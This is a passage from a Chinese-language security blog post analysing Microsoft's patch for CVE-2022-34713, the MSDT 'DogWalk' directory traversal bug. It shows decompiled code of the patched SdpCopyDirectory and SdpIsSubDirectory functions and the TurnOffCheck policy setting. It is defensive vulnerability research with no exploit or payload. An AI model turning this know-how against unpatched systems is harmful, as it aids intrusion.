<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><h3 id="sdiageng-SdpCopyDirectory"><a href="#sdiageng-SdpCopyDirectory" class="headerlink" title="sdiageng!SdpCopyDirectory"></a>sdiageng!SdpCopyDirectory</h3><p>位于<code>sdiageng!SdpCopyDirectory</code> (19044.1899):</p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155426628.png"></p>
<p>添加了检查目录的逻辑。</p>
<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall SdpCopyDirectory(const unsigned __int16 *aPckSource, const unsigned __int16 *aTmpSDiagPath)
{
  const unsigned __int16 *lsTmpSDiagPath; // r13
  const unsigned __int16 *lPckSource; // r12
  char bFlagTurnOffCheck; // di
  LSTATUS lRes1; // eax
  __int64 v6; // r8
  unsigned __int64 lRes2; // r9
  char *hFind; // r15
  __int64 itraceCode1; // r8
  int dwLastError5; // er9
  unsigned int dwLastError2; // ebx
  LSTATUS dwRet1; // eax
  __int64 v13; // r8
  signed int dwRet2; // ebx
  wchar_t *sWebDavFile; // rsi
  wchar_t *sTmpSDiagFile; // r14
  int dwLastError3; // er9
  __int64 itraceCode2; // r8
  signed int dwLastError4; // eax
  signed int dwLastError6; // eax
  __int64 v21; // r8
  signed int dwLastError1; // eax
  BYTE Data[4]; // [rsp+30h] [rbp-D0h]
  DWORD cbData; // [rsp+34h] [rbp-CCh]
  DWORD Type; // [rsp+38h] [rbp-C8h]
  HKEY hKey; // [rsp+40h] [rbp-C0h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+50h] [rbp-B0h]
  wil::details::in1diag3 *retaddr; // [rsp+2E8h] [rbp+1E8h]

  lsTmpSDiagPath = aTmpSDiagPath;
  lPckSource = aPckSource;
  if ( byte_7FFC50EF27F8 )
  {
    bFlagTurnOffCheck = byte_7FFC50EF2858;
    goto DEBUG_TRACE1;
  }
  hKey = 0i64;                                  // TurnOffCheck Registry key turned on
  lRes1 = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics",
            0,
            0x20019u,
            &amp;hKey);
  lRes2 = lRes1 | 0x80070000;
  if ( lRes1 &lt;= 0 )
    lRes2 = lRes1;
  if ( (lRes2 &amp; 0x80000000) != 0i64 )
  {
    wil::details::in1diag3::_Log_Hr(retaddr, 0x7EA, v6, lRes2);
TURNOFFCHECK_OFF:
    bFlagTurnOffCheck = 1;
    goto DEBUG_TRACE1;
  }
  if ( !hKey )
    goto TURNOFFCHECK_OFF;
  *Data = 0;
  Type = 4;
  cbData = 4;
  dwRet1 = RegQueryValueExW(hKey, L"TurnOffCheck", 0i64, &amp;Type, Data, &amp;cbData);
  dwRet2 = dwRet1 | 0x80070000;
  if ( dwRet1 &lt;= 0 )
    dwRet2 = dwRet1;
  if ( dwRet2 &lt; 0 )
    wil::details::in1diag3::_Log_Hr(retaddr, 0x7FB, v13, dwRet2);
  if ( hKey )
    RegCloseKey(hKey);
  if ( dwRet2 &lt; 0 || (bFlagTurnOffCheck = 0, !*Data) )
    bFlagTurnOffCheck = 1;
  byte_7FFC50EF2858 = bFlagTurnOffCheck;
  byte_7FFC50EF27F8 = 1;
DEBUG_TRACE1:
  hFind = 0i64;
  if ( !lPckSource )                            // Check arguments for errors
  {
    itraceCode1 = 2103i64;
DEBUG_TRACE2:
    dwLastError5 = -2147024809;
DEBUG_TRACE3:
    dwLastError2 = dwLastError5;
    SdpDebugTrace(1u, L"SdpCopyDirectory", itraceCode1, dwLastError5);
    return dwLastError2;
  }
  if ( !lsTmpSDiagPath )
  {
    itraceCode1 = 2104i64;
    goto DEBUG_TRACE2;
  }
  sWebDavFile = operator new[](0x208ui64);
  if ( !sWebDavFile )
  {
    dwLastError5 = -2147024882;
    itraceCode1 = 2107i64;
    goto DEBUG_TRACE3;
  }
  sTmpSDiagFile = operator new[](0x208ui64);
  if ( !sTmpSDiagFile )
  {
    dwLastError3 = -2147024882;
    itraceCode2 = 2110i64;
    dwLastError2 = -2147024882;
    goto DEBUG_TRACE5;
  }
  dwLastError4 = StringCchPrintfW(sWebDavFile, 260i64, L"%s\\*", lPckSource);
  dwLastError2 = dwLastError4;
  if ( dwLastError4 &lt; 0 )
  {
    itraceCode2 = 2113i64;
    goto DEBUG_TRACE4;
  }
  hFind = FindFirstFileW(sWebDavFile, &amp;FindFileData);// Search for file or directory in WebDavRoot\*
  if ( (hFind - 1) &lt;= 0xFFFFFFFFFFFFFFFDui64 )
  {
    do
    {
      if ( !(FindFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) )// Isn't it a directory? Setup sWebDavFile and sTmpSDiagFile
      {
        dwLastError4 = StringCchPrintfW(sWebDavFile, 260i64, L"%s\\%s", lPckSource, FindFileData.cFileName);
        dwLastError2 = dwLastError4;
        if ( dwLastError4 &lt; 0 )
        {
          itraceCode2 = 2134i64;
DEBUG_TRACE4:
          dwLastError3 = dwLastError4;
DEBUG_TRACE5:
          SdpDebugTrace(1u, L"SdpCopyDirectory", itraceCode2, dwLastError3);
          break;
        }
        dwLastError4 = StringCchPrintfW(sTmpSDiagFile, 260i64, L"%s\\%s", lsTmpSDiagPath, FindFileData.cFileName);
        dwLastError2 = dwLastError4;
        if ( dwLastError4 &lt; 0 )
        {
          itraceCode2 = 0x85Di64;
          goto DEBUG_TRACE4;
        }
        if ( bFlagTurnOffCheck )                // Is TurnOffCheck turned off?
        {
          *Data = 0;
          dwLastError6 = SdpIsSubDirectory(lPckSource, sWebDavFile, Data);// Check if any WebDav file is sub-directory of package source 
          if ( dwLastError6 &lt; 0 )
            goto REPORT_FAILURE;
          if ( !*Data )
            continue;
          *Data = 0;
          dwLastError6 = SdpIsSubDirectory(lsTmpSDiagPath, sTmpSDiagFile, Data);// Check if any file at %TMP\SDIAG_random-clsid is sub-directory of folder %TMP%\SDIAG_random-clsid
          if ( dwLastError6 &lt; 0 )
          {
REPORT_FAILURE:
            wil::details::in1diag3::_Log_Hr(retaddr, 0x80D, v21, dwLastError6);
            continue;
          }
          if ( !*Data )                         // Result is stored at "Data": *Data=0x1 =&gt; CopyFile, if not: continue. 
                                                // So this is actually the ##DogWalk vuln check.
            continue;
        }
        if ( CopyFileW(sWebDavFile, sTmpSDiagFile, 1) )// Vulnerable CopyFile op
        {
          dwLastError2 = 0;
        }
        else
        {
          dwLastError1 = GetLastError();
          dwLastError2 = dwLastError1 | 0x80070000;
          if ( dwLastError1 &lt;= 0 )
            dwLastError2 = dwLastError1;
          if ( (dwLastError2 &amp; 0x80000000) != 0 )
          {
            dwLastError3 = dwLastError2;
            itraceCode2 = 2151i64;
            goto DEBUG_TRACE5;
          }
        }
      }
    }
    while ( FindNextFileW(hFind, &amp;FindFileData) );// File Search
  }
  operator delete(sWebDavFile);
  if ( sTmpSDiagFile )
    operator delete(sTmpSDiagFile);
  if ( (hFind - 1) &lt;= 0xFFFFFFFFFFFFFFFDui64 )
    FindClose(hFind);
  return dwLastError2;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读取TurnoffCheck设置。  检查参数是否有错误。  检查WebDAVROOT中是否存在文件夹或文件\，如果存在则继续。  如果turnoffcheck setup，则copyfile不进行其他检查。  否则，检查是否有任何WebDAV文件是包源的子目录。  然后，检查是否有任何文件是文件夹%tmp%\sdiag_random-clsid的子目录。  如果*data=1，则copyfile，否则文件/文件夹搜索将继续。 </p>
<h3 id="sdiageng-SdpIsSubDirectory"><a href="#sdiageng-SdpIsSubDirectory" class="headerlink" title="sdiageng!SdpIsSubDirectory"></a>sdiageng!SdpIsSubDirectory</h3><pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall SdpIsSubDirectory(const unsigned __int16 *aParentDir, const unsigned __int16 *aChildDir, int *aData)
{
  int *lData; // r14
  const unsigned __int16 *lChildDir; // r12
  wchar_t *sChildDir3; // rdi
  size_t iLenParentDir; // rsi
  unsigned __int64 iLenChildDir; // rbp
  __int64 itraceCode1; // r8
  signed int dwLastError1; // ebx
  signed int dwLastError4; // eax
  wchar_t *sParentDir2; // r15
  int dwLastError3; // er9
  __int64 itraceCode3; // r8
  signed int dwLastError5; // eax
  int dwLastError2; // er9
  __int64 itraceCode2; // r8
  __int64 iCharCounter1; // rdx
  wchar_t *sParentDir3; // rax
  __int64 iCharCounter2; // rdx
  wchar_t *sChildDir2; // rax
  wchar_t *sChildDir1; // [rsp+60h] [rbp+8h]
  wchar_t *sParentDir1; // [rsp+78h] [rbp+20h]

  lData = aData;
  sParentDir1 = 0i64;
  lChildDir = aChildDir;
  sChildDir1 = 0i64;
  sChildDir3 = 0i64;
  iLenParentDir = 0i64;
  iLenChildDir = 0i64;
  if ( !aParentDir )                            // Check arguments for errors
  {
    itraceCode1 = 1957i64;
DEBUG_TRACE1:
    dwLastError1 = -2147024809;
    SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode1, -2147024809);
    return dwLastError1;
  }
  if ( !aChildDir )
  {
    itraceCode1 = 1958i64;
    goto DEBUG_TRACE1;
  }
  if ( !aData )
  {
    itraceCode1 = 1959i64;
    goto DEBUG_TRACE1;
  }
  dwLastError4 = SdpGetFullPath(aParentDir, &amp;sParentDir1, 0i64);// Get Full path for parent directory
  sParentDir2 = sParentDir1;
  dwLastError1 = dwLastError4;
  if ( dwLastError4 &gt;= 0 )
  {
    dwLastError5 = SdpGetFullPath(lChildDir, &amp;sChildDir1, 0i64);// Get Full path for child directory
    dwLastError1 = dwLastError5;
    if ( dwLastError5 &gt;= 0 )
    {
      if ( sParentDir2 )
      {
        iCharCounter1 = 260i64;
        sParentDir3 = sParentDir2;
        do                                      // Calculate length for parent directory
        {
          if ( !*sParentDir3 )
            break;
          ++sParentDir3;
          --iCharCounter1;
        }
        while ( iCharCounter1 );
        dwLastError1 = iCharCounter1 == 0 ? 0x80070057 : 0;
        if ( iCharCounter1 )
          iLenParentDir = 260 - iCharCounter1;
      }
      else
      {
        dwLastError1 = -2147024809;
      }
      if ( dwLastError1 &lt; 0 )
        iLenParentDir = 0i64;
      if ( dwLastError1 &gt;= 0 )
      {
        sChildDir3 = sChildDir1;
        if ( sChildDir1 )
        {
          iCharCounter2 = 260i64;
          sChildDir2 = sChildDir1;
          do                                    // Calculate length for child directory
          {
            if ( !*sChildDir2 )
              break;
            ++sChildDir2;
            --iCharCounter2;
          }
          while ( iCharCounter2 );
          dwLastError1 = iCharCounter2 == 0 ? 0x80070057 : 0;
          if ( iCharCounter2 )
            iLenChildDir = 260 - iCharCounter2;
        }
        else
        {
          dwLastError1 = -2147024809;
        }
        if ( dwLastError1 &lt; 0 )
          iLenChildDir = 0i64;
        if ( dwLastError1 &gt;= 0 )
        {                                       // 1) Len for child dir &gt; Len for parent dir
                                                // 2) _wcsnicmp: Child dir begins with parent dir. Parent dir: %tmp%\SDIAG_random-clsid
                                                // 3) Last char of parent dir is "\" or next char for child dir, 
                                                // further than parent dir length, is "\" and exist further chars after this.
          *lData = iLenChildDir &gt; iLenParentDir
                &amp;&amp; !_wcsnicmp(sParentDir2, sChildDir1, iLenParentDir)
                &amp;&amp; (sParentDir2[iLenParentDir - 1] == '\\'
                 || sChildDir3[iLenParentDir] == '\\' &amp;&amp; sChildDir3[iLenParentDir + 1]);
          goto CLEANUP;
        }
        dwLastError3 = dwLastError1;
        itraceCode3 = 1971i64;
        goto DEBUG_TRACE2;
      }
      dwLastError2 = dwLastError1;
      itraceCode2 = 1968i64;
    }
    else
    {
      dwLastError2 = dwLastError5;
      itraceCode2 = 1965i64;
    }
    SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode2, dwLastError2);
    sChildDir3 = sChildDir1;
    goto CLEANUP;
  }
  dwLastError3 = dwLastError4;
  itraceCode3 = 1962i64;
DEBUG_TRACE2:
  SdpDebugTrace(1u, L"SdpIsSubDirectory", itraceCode3, dwLastError3);
CLEANUP:
  if ( sParentDir2 )
    operator delete(sParentDir2);
  if ( sChildDir3 )
    operator delete(sChildDir3);
  return dwLastError1;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检查参数是否有错误。 获取父目录的完整路径。 获取子目录的完整路径。 计算父目录的字符串长度。 计算子目录的字符串长度。 检查子目录是否真的是父目录的子目录。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
<li><a href="https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd">https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example">https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example</a></li>
</ul>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
</search>
